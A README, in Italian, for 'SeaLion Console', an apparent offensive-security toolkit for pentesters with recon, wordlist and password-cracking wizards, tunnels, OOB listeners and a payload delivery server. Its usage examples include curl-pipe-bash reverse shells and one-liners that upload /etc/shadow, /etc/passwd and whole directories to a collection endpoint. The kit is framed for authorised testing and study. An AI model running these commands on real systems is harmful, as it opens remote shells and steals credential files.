# SeaLion Console

![Version](https://img.shields.io/badge/dynamic/regex?url=https%3A%2F%2Fraw.githubusercontent.com%2FStarlix27%2FSeaLion%2Fmain%2FVERSION&search=(.*)&label=version&color=blue)

```
                                                     .====-:.
                                                  .==-###==+.:--
                                                 +.-*#%%*=:.:+%@*=
                                                *-++++*+===+#%%@*:.
                                                =+*++++-+#%*%#*. ..
                                                ++++*#*%#%%#*#+   .
                                               .++==+*-=#@@@%#*
                                               +++===-=+####%#*
                                             ===+=======+*####*
                                           .+=--=====++++***##+
                                         :=++=-----===+****##*+
                                    --+==++==========++***##**:
                           .====++++***-+*+==++++++++***####*=.
                       -*+********##*+=*#**+++******####%##+==.
                     ##########%####+=*######****#########*=+=
                   *%%###%%%%%%%%%%*=*%%###############%#*++=
                  +**#*+*##%%%%%%#**-%%%%%##########%%###*==#
                 #@@@@%#*+**#####**+*%@%@@@%%%####%%%##*#%@@#
               .***@@@  =+++**####%##@@%@@@@%%%%%%###*%@@@@@#
               ####%#@=      *+++*%#%@%%@@@@@%%%####+  =##@@#
               ##+-# %           %@@@@%%@@@@@@%*          *@%#
                              =%%#%@@%*@*                   .%%%#*+=-..
                           .#%@%######@+
                        -*#######%@%:
                    =###%%%+.
```

**Personal tool vault per pentester.** Console interattiva per gestire e consultare tool di sicurezza offensiva, automatizzare la reconnaissance, creare wordlist, gestire tunnel e listener OOB, servire payload di post-exploitation e studiare con un quiz dedicato ai colloqui junior.

### Funzionalità principali

- **42 tool integrati** con installazione guidata e documentazione locale.
- **Recon automatica** con profili Fast, Medium e Full, enumerazione mirata dei servizi e report.
- **Quick Delivery, Loot, Tunnel e Pivot** per supportare le attività su ambienti autorizzati.
- **Catch OOB** con listener TCP, DNS, FTP e SMB eseguibili in parallelo.
- **Wordfind, Wordgen, Passfind e BURP** per scegliere e costruire wordlist e comandi.
- **SLWeb responsive** con documentazione, payload, loot, log, PET e terminale di navigazione.
- **Pentest Interview Minigame** con 620 domande a scelta multipla e completamento.

---

## Download veloce
```bash
curl https://file.ax/slconsole | bash
```

## Installazione

```bash
git clone https://github.com/Starlix27/SeaLion.git
cd SeaLion
bash setup.sh
```

`setup.sh` crea i comandi `slconsole` e `sealsay` in `~/.local/bin/` e aggiorna il PATH. Installa anche `chafa` se mancante.

Per applicare subito senza riaprire il terminale:

```bash
source ~/.bashrc
```

**Requisiti:** Python 3.10+, Linux (WSL supportato). `chafa` per animazione Ctrl+C (installato automaticamente). `rich` opzionale per rendering Markdown migliorato (`pip install rich`).

**Auto-update:** all'avvio slconsole si sincronizza automaticamente con il repository remoto. Se ci sono aggiornamenti, vengono applicati subito senza intervento manuale.

---

## Utilizzo

```bash
slconsole              # Avvia la console interattiva
sealsay "ciao"        # Stampa un messaggio con il sealion ASCII art
slconsole list         # Elenca i tool disponibili
slconsole search <q>   # Cerca tool per nome o descrizione
slconsole vuln smb     # Cheatsheet vulnerabilità SMB
slconsole vuln list    # Elenca tutti i protocolli per categoria
slconsole recon <IP>   # Avvia la reconnaissance automatica
slconsole reconfind 445 # Suggerisce tool e comandi per porta/servizio/task
slconsole --version    # Versione
```

### Console interattiva

```
slconsole> list                   # Mostra tutti i tool
slconsole> search scanner         # Ricerca full-text
slconsole> use nmap               # Seleziona un tool
slconsole(nmap)> install          # Installa il tool selezionato
slconsole> vuln ftp               # Cheatsheet FTP
slconsole> vuln list              # Elenca protocolli per categoria
slconsole> notes <argomento>      # Guide e appunti
slconsole> find <parola>          # Cerca in vuln, tool e notes
slconsole> serve on               # Avvia il server HTTP di delivery
slconsole> serve list             # Mostra file serviti con curl
slconsole> loot                   # Elenca file ricevuti dalla vulnbox
slconsole> loot read <nome|num>   # Mostra contenuto di un file loot
slconsole> recon <target>         # Recon automatica e report finale
slconsole> reconfind <query>      # Cerca tool per porta, servizio o attività
slconsole> tunnel on <porta>      # Port forwarding reverse con chisel
slconsole> pivot on               # Tunneling IP con ligolo-ng
slconsole> catch tcp on           # Listener OOB TCP in background
slconsole> wordfind http://target # Wizard wordlist per fuzzing/bruteforce
slconsole> passfind               # Wizard password cracking
slconsole> wordgen                # Wizard per creare e trasformare wordlist
slconsole> burp                   # Profiler di password basato sul target
slconsole> pet                    # Il tuo sealion virtuale
slconsole> back                   # Torna alla console principale
```

| Tasto | Azione |
|-------|--------|
| **ESC ESC** | Esci da slconsole |
| **Ctrl+C** | Animazione ~spin~ (premi di nuovo per fermarla) |
| **Freccia Su/Giu** | Naviga la cronologia comandi |
| **Tab** | Autocompletamento comandi |

---

## Quick-Delivery Server (`serve`)

Server HTTP in background per post-exploitation. Serve payload dinamici e file statici dalla cartella `static/`, pronti da scaricare via `curl` dal target.

```
slconsole> serve on                          # Avvia (seleziona interfaccia di rete)
slconsole> serve on --port 9090 --lport 4444 # Porta e LPORT custom
slconsole> serve off                         # Arresta
slconsole> serve status                      # Stato corrente
slconsole> serve fetch                       # Scarica tool di post-exploitation in static/
slconsole> serve list                        # Elenca file con comandi curl pronti
slconsole> serve help                        # Documentazione completa
```

### Endpoint dinamici

| Endpoint | Curl |
|----------|------|
| `/upgrade` | `curl http://<IP>:2727/upgrade \| bash` — upgrade shell (socat/python pty) |
| `/upgrade2` | `curl http://<IP>:2727/upgrade2 \| bash` — upgrade in-place (no nuova connessione) |
| `/rev` | `curl http://<IP>:2727/rev \| bash` — reverse shell Bash |
| `/sh` | `curl http://<IP>:2727/sh \| bash` — reverse shell Python |
| `/upload` | `curl -F "file=@/path/file" http://<IP>:2727/upload` — upload file dalla vulnbox |

### File statici

Qualsiasi file messo nella cartella `static/` viene automaticamente servito e mostrato in `serve list` e `serve on` con il comando curl corretto:
- `.sh` → `curl http://<IP>:2727/file.sh | bash`
- `.exe` → `curl http://<IP>:2727/file.exe -o file.exe`
- binari → `curl http://<IP>:2727/file -o file && chmod +x file`

Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum e altri.

---

## Loot — Upload dalla Vulnbox (`loot`)

Endpoint `/upload` per ricevere file dalla macchina vittima. I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente, consultabili da console, web e filesystem.

### Upload dalla vulnbox

```bash
# Upload file singolo (multipart form — il più comune)
curl -F "file=@/etc/passwd" http://<IP>:2727/upload

# Upload via pipe (utile per output di comandi)
cat /etc/shadow | curl -X POST -d @- http://<IP>:2727/upload/shadow.txt

# Upload con PUT (nome file nell'URL)
curl -T /tmp/database.db http://<IP>:2727/upload/database.db

# Esfiltra cartelle intere via tar
tar czf - /etc /var/log | curl -X POST -d @- http://<IP>:2727/upload/exfil.tar.gz

# Upload multipli in un colpo solo
for f in /etc/passwd /etc/shadow /etc/hosts; do
    curl -F "file=@$f" http://<IP>:2727/upload
done
```

I file vengono salvati con il formato `<IP>_<DATA>_<ORA>_<NOME>`, ad esempio `10.10.14.5_2024-01-15_14-30-22_passwd`.

### Gestione loot dalla console

```
slconsole> loot                   # Elenca i file ricevuti
slconsole> loot read <nome|num>   # Mostra il contenuto di un file
slconsole> loot clear             # Elimina tutti i file loot
slconsole> loot help              # Documentazione completa
```

---

## Wordfind — Wizard Wordlist (`wordfind`)

Wizard interattivo che in base al target, scopo, tecnologia e intensità suggerisce le wordlist giuste da SecLists e genera comandi pronti per fuzzing e bruteforce.

```
slconsole> wordfind http://10.10.11.42
slconsole> wordfind https://target.htb
slconsole> wordfind http://10.10.11.42/login
slconsole> wordfind http://10.10.11.42/api/v1
```

### Flusso del wizard

Il wizard fa domande diverse in base allo scopo selezionato:

| Step | Domanda | Quando |
|------|---------|--------|
| Scopo | Directory/subdomain/vhost/parametri/username/password/API | Sempre |
| Tecnologia | PHP/ASP/Java/Python/Node/WordPress/Joomla/generico | Solo per directory |
| Tipo API | REST/GraphQL/Swagger | Solo per API |
| Contesto password | Login web/servizio di rete/hash offline | Solo per password |
| Lingua | Inglese/Italiano/Spagnolo/Tedesco/Francese/misto | Solo per password |
| Username | Testo libero | Solo per password |
| Intensità | Veloce/media/completa | Sempre |

### Tool supportati nei comandi generati

| Scopo | Tool |
|-------|------|
| **Directory/file** | gobuster, ffuf, dirb, feroxbuster, wfuzz, dirsearch |
| **Sottodomini** | gobuster, ffuf, wfuzz, amass, dnsenum |
| **Virtual Host** | gobuster, ffuf, wfuzz |
| **Parametri** | ffuf, wfuzz, arjun |
| **Password web** | hydra, ffuf, wfuzz, medusa |
| **Password servizi** | hydra, medusa, ncrack, crackmapexec |
| **Hash offline** | john, hashcat |
| **API** | ffuf, gobuster, wfuzz, feroxbuster |

### Esempio

```
slconsole> wordfind http://10.10.11.42

  [1] Cosa stai cercando?    → Directory / file
  [2] Tecnologia?            → PHP
  [3] Intensità?             → Media

  ┌─ Risultato ────────────────────────────────┐

  Wordlist consigliate:
    [1] DirBuster-2007_directory-list-2.3-medium.txt  (220k)
    [2] common.txt                      (4.7k)
    [3] PHP.fuzz.txt                    (274)

  Estensioni: .php,.phtml,.txt,.bak,.php.bak

  Comandi pronti:

    gobuster dir -u http://10.10.11.42 \
      -w .../DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak -t 50

    ffuf -u http://10.10.11.42/FUZZ \
      -w .../DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.bak -t 50 -c

  └────────────────────────────────────────────┘
```

---

## Passfind — Wizard Password Cracking (`passfind`)

Wizard interattivo per password cracking. Genera comandi pronti per John The Ripper, Hashcat, Hydra, Medusa, ncrack e crackmapexec in base allo scenario.

```
slconsole> passfind
```

### Scopi disponibili

| Scopo | Cosa fa |
|-------|---------|
| **Hash** | Identifica formato hash → sceglie attacco (wordlist, mask, incremental) → genera comandi john + hashcat |
| **File protetto** | SSH key, PDF, Office, ZIP, RAR, 7z, KeePass, PuTTY → estrazione con *2john + cracking |
| **Archivio/disco** | BitLocker, TrueCrypt, LUKS, OpenSSL enc → estrazione hash + cracking + mount |
| **Servizio di rete** | SSH, RDP, FTP, SMB, HTTP, MySQL, WinRM, VNC → hydra/medusa/ncrack/crackmapexec |

### Esempio

```
slconsole> passfind

  [1] Cosa devi crackare?     → Hash
  [2] Hai l'hash?             → Sì, identificalo
  [3] Formato?                → NTLM
  [4] Attacco?                → Wordlist + regole
  [5] Intensità?              → Completa

  ┌─ Risultato ────────────────────────────────┐

  Comandi pronti:

    # john (wordlist + rules)
    john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt

    # hashcat (wordlist + rules)
    hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt \
      -r /usr/share/hashcat/rules/best64.rule

  └────────────────────────────────────────────┘
```

---

## Reconnaissance (`recon` e `reconfind`)

`recon` esegue una pipeline di ricognizione con output live, follow-up specifici per i servizi trovati e report salvabili. Le attività basate su wordlist possono essere eseguite in una shell separata e fermate con Invio senza interrompere il resto della recon.

```bash
slconsole> recon 10.10.11.42                 # Profilo Full
slconsole> recon 10.10.11.42 --medium        # Profilo bilanciato
slconsole> recon 10.10.11.42 --fast          # Top port e controlli web essenziali
slconsole> recon 10.10.11.42 --wordlists     # Directory, VHost, WordPress e parametri
slconsole> recon 10.10.11.42 --phase web     # Solo una fase
slconsole> recon 10.10.11.42 -o              # Salva in loot/recon/
slconsole> recon medium -i                    # Mostra il piano senza eseguirlo
```

`reconfind` parte invece da una porta, un servizio, una tecnologia o un'attività e propone tool, cheatsheet e comandi pronti:

```bash
slconsole> reconfind 445
slconsole> reconfind wordpress
slconsole> reconfind active directory
slconsole> reconfind smb brute
slconsole> reconfind privesc
```

---

## Tunnel e Pivot

| Comando | Tecnologia | Utilizzo |
|---------|------------|----------|
| `tunnel on <porta>` | chisel | Espone localmente una singola porta TCP del target |
| `pivot on` | ligolo-ng | Crea un'interfaccia TUN per raggiungere una rete interna |
| `pivot route add <CIDR>` | ligolo-ng | Aggiunge una rotta alla rete raggiungibile dal target |

Workflow essenziale:

```bash
slconsole> serve on
slconsole> tunnel fetch                 # Scarica chisel in static/
slconsole> tunnel on 8080 --local-port 9001

slconsole> pivot fetch                  # Scarica proxy e agent ligolo-ng
slconsole> pivot on
slconsole> pivot session
slconsole> pivot route add 172.16.0.0/24
slconsole> pivot off
```

Usa `tunnel help` o `pivot help` per prerequisiti, stato, chiusura e comandi da copiare sul target autorizzato.

---

## Catch — Listener OOB (`catch`)

Avvia listener in background per confermare vulnerabilità blind e osservare callback. Più listener possono funzionare contemporaneamente al server HTTP.

| Tipo | Porta predefinita | Scopo |
|------|:-----------------:|-------|
| TCP | 4444 | Callback generiche per RCE, SSRF e SSTI |
| DNS | 53 | Query OOB, token di correlazione ed esfiltrazione DNS |
| FTP | 2121 | Callback ed esfiltrazione da parser XML |
| SMB | 445 | Connessioni UNC e cattura NTLMv2 |

```bash
slconsole> catch tcp on
slconsole> catch dns on --port 5353
slconsole> catch dns token
slconsole> catch status
slconsole> catch logs dns
slconsole> catch off
```

I listener e i relativi log sono consultabili anche dalla pagina `/catch` di SLWeb.

---

## Wordgen e BURP

`wordgen` crea o trasforma wordlist tramite un wizard con 16 metodi, tra cui CeWL, Crunch, CUPP, regole John/Hashcat, Maskprocessor, Princeprocessor, Username Anarchy, rsmangler e combinazioni Bash/Python.

```bash
slconsole> wordgen
```

`burp` (**Better User Research Password**) genera una wordlist mirata usando informazioni autorizzate sul target: nomi, date, familiari, animali, azienda e parole chiave. I livelli Fast, Medium e Full controllano quantità e profondità delle permutazioni.

```bash
slconsole> burp
```

Il profiler BURP è disponibile anche in SLWeb all'indirizzo `/burp`.

---

## SLWeb — Piattaforma Web

**SLWeb** (SeaLionWeb) è la piattaforma web integrata in SeaLion Console. Si avvia automaticamente insieme alla console sulla porta `2727` e permette di consultare tutti i contenuti dal browser.

### Cosa offre

| Sezione | URL | Contenuto |
|---------|-----|-----------|
| **Home** | `/` | Mascotte sealsay con tips, terminale interattivo per navigare |
| **Notes** | `/notes/` | Guide e appunti (footprinting, shells, password cracking...) |
| **Vuln** | `/vuln/` | Cheatsheet per protocolli vulnerabili |
| **Tools** | `/tools/` | Documentazione di tutti i tool installabili |
| **Static** | `/static/` | Gestione file statici (crea, importa, modifica, elimina) |
| **Delivery** | `/delivery` | Pannello curl per post-exploitation |
| **Loot** | `/loot/` | File ricevuti dalla vulnbox (visualizza, scarica, elimina) |
| **Catch** | `/catch` | Stato e log live dei listener OOB TCP, DNS, FTP e SMB |
| **Logs** | `/logs` | Log delle richieste gestite dal server |
| **BURP** | `/burp` | Profiler visuale per generare wordlist mirate |
| **Pet** | `/pet` | SeaLion virtuale, statistiche, azioni e minigiochi |
| **Pentest Quiz** | `/pet/minigame` | Quiz fullscreen configurabile per prepararsi ai colloqui |
| **Search** | `/search` | Ricerca unificata in notes, vulnerabilità e tool |

### Come accedere

SLWeb si avvia in automatico quando si lancia `slconsole`. Il link viene mostrato nel banner:

```
  SLWeb: http://<IP>:2727
```

Dalla CLI, ogni volta che si apre un file `.md` (con `vuln`, `notes` o `tool`), viene mostrato anche il link diretto alla pagina web corrispondente.

Il terminale della Home supporta suggerimenti filtrati: premendo Invio viene eseguito il primo risultato compatibile, oppure quello selezionato con le frecce. Anche il terminale PET usa lo stesso comportamento senza interferire con gli input dei giochi.

SLWeb è responsive: su telefono il SeaLion rimane ben visibile, i contenuti si adattano alla larghezza disponibile e il minigame usa controlli touch-friendly.

### Pentest Interview Minigame

Il minigame contiene attualmente **620 domande** distribuite nelle aree Web Application Security, networking e protocolli, reconnaissance e tooling, privilege escalation e post-exploitation, reporting ed etica.

- **159 domande a scelta multipla**, con motivazione per ogni risposta corretta o errata.
- **461 completamenti**, con un input inserito direttamente al posto di `____` e verifica automatica.
- Livelli **Base**, **Intermedio**, **Avanzato** ed **EXTREME**; le nuove sessioni partono dal livello Base.
- Sessioni da 10 domande per impostazione predefinita, modificabili dal menu `⋮`.
- Filtri combinabili per categoria, difficoltà e tipo di domanda.
- ID visibile, punteggio, spiegazione, soluzione completa e navigazione precedente/successiva.

Il quiz può essere aperto dalla pagina PET oppure digitando `minigame` nel terminale Home o PET. La banca è un normale file JSON estendibile:

```text
data/pentest_questions.json
```

Lo schema e le istruzioni per aggiungere domande sono documentati in [data/README.md](data/README.md).

### Rendering Markdown

I contenuti `.md` vengono renderizzati in stile Notion con syntax highlighting per i blocchi di codice, tabelle formattate e navigazione breadcrumb.

### Build statica

La stessa interfaccia può essere generata in `site/` per GitHub Pages o hosting statico:

```bash
python3 build_site.py

# Repository ospitato sotto un percorso, per esempio /SeaLion/
SITE_BASE_PATH=/SeaLion/ python3 build_site.py
```

---

## Pet — Il tuo SeaLion virtuale (`pet`)

Mascotte virtuale che vive nella console. **Non muore mai**: le statistiche partono al 50% e scendono lentamente ogni giorno, ma il minimo è 0% — peggio di così diventa solo un *Very Sad Sealion :(*.

```
slconsole> pet                  # Stato (felicità, sazietà, umore)
slconsole> pet feed             # Nutrisci — 1 volta al giorno dice AAAAAA
slconsole> pet play             # Gioca con lui (+felicità)
slconsole> pet annoy            # Infastidisci (-5 felicità, GRRRRRRR)
slconsole> pet spin             # Barrel roll in GIF (come Ctrl+C)
slconsole> pet say <testo>      # Fai dire qualcosa al sealion
slconsole> pet game             # Minigiochi: indovina il numero, morra cinese, testa o croce
slconsole> pet name <nome>      # Rinomina il sealion
slconsole> pet help             # Documentazione
```

Le statistiche sono salvate in un singolo file: `~/.sealionconsole/pet.json`.

Nel portale SLWeb il PET dispone inoltre di un terminale dedicato, animazioni ASCII e dei giochi Blackjack, Wordle, Guess e 8Ball. Il comando `minigame` apre invece il quiz di preparazione ai colloqui.

---

## Tool inclusi (42)

| Categoria | Tool |
|-----------|------|
| **Ricognizione & OSINT** | nmap, shodan, theHarvester, recon-ng, finalrecon, whois, amass |
| **DNS, Web Fuzzing & Crawling** | dnsenum, gobuster, ffuf, feroxbuster, dirsearch, wfuzz, nikto, scrapy, httrack, nuclei |
| **Enumerazione Servizi** | enum4linux-ng, smbmap, crackmapexec/netexec, onesixtyone, braa, ssh-audit, rdp-sec-check |
| **Accesso Remoto & Post-Exploitation** | evil-winrm, impacket, odat, xfreerdp |
| **Password Cracking & Wordlist** | john, hashcat, hashid, hydra, ncrack, medusa, cewl, seclists, htb-wordlists |
| **Web Application** | wafw00f, arjun |
| **Framework** | msfconsole |
| **Altro** | basics |

---

## Protocolli vulnerabili (`vuln`) — 15

| Categoria | Protocolli |
|-----------|-----------|
| **Trasferimento File** | ftp, smb, nfs |
| **DNS & Ricognizione** | dns |
| **Email** | smtp, imap-pop3 |
| **Monitoraggio Rete** | snmp |
| **Database** | mysql, mssql, oracle-tns |
| **Accesso Remoto** | ssh, rdp, winrm, wmi |
| **Hardware & Management** | ipmi |

Ogni cheatsheet include: descrizione, porte, vulnerabilità comuni, comandi di enumerazione e tool consigliati.

---

## Aggiungere contenuti

### Nuovo tool

Crea una sottocartella in `tool/` con due file:

```
tool/mio-tool/
├── help.md        # Documentazione in Markdown
└── install.py     # Script di installazione
```

Il tool apparira automaticamente in `slconsole list`.

### Nuovo protocollo vulnerabile

Crea un file `.md` in `vuln/`:

```
vuln/mio-protocollo.md
```

### File statici per il server

Metti qualsiasi file nella cartella `static/` — apparira automaticamente in `serve list` e sara servito dal Quick-Delivery Server.

### Nuova domanda del minigame

Modifica [data/pentest_questions.json](data/pentest_questions.json) seguendo lo schema descritto in [data/README.md](data/README.md). Sono supportati i tipi `multiple_choice` e `completion`; per un completamento inserisci una sola sequenza `____` nel testo della domanda.

Per ribilanciare una banca importata e convertire le vecchie risposte libere:

```bash
python3 scripts/rebalance_pentest_questions.py
```

---

## Struttura del progetto

```
SeaLion/
├── sealion.py              # Console principale e routing dei comandi
├── http_server.py          # Quick-Delivery, listener e SLWeb dinamico
├── build_site.py           # Generatore della versione statica di SLWeb
├── setup.sh                # Installer (crea comandi slconsole e sealsay)
├── pyproject.toml          # Metadata pacchetto
├── README.md
│
├── lib/                     # Moduli per PET, recon, catch, BURP e wizard
│   ├── recon.py
│   ├── reconfind.py
│   ├── serve.py
│   ├── catch.py
│   ├── burp.py
│   └── wizards.py
│
├── data/
│   ├── pentest_questions.json  # Banca del minigame
│   └── README.md               # Schema per aggiungere domande
│
├── scripts/
│   ├── import_pentest_questions.py
│   └── rebalance_pentest_questions.py
│
├── tool/                   # 42 tool — ogni sottocartella contiene:
│   ├── nmap/
│   │   ├── help.md     #   documentazione
│   │   └── install.py  #   script di installazione
│   └── ...
│
├── notes/                  # Guide e appunti in Markdown
├── vuln/                   # 15 protocolli — un file .md per ognuno
│   ├── ftp.md
│   ├── smb.md
│   └── ...
│
├── static/                 # Payload e script serviti dal Quick-Delivery
│   ├── linseal.sh
│   └── slrecon.sh
│
├── loot/                   # File ricevuti dalla vulnbox via /upload
│   └── ...
│
└── assets/                 # ASCII art, frame animati, tips e GIF
    ├── sealion_say.txt
    └── spinning.gif
```
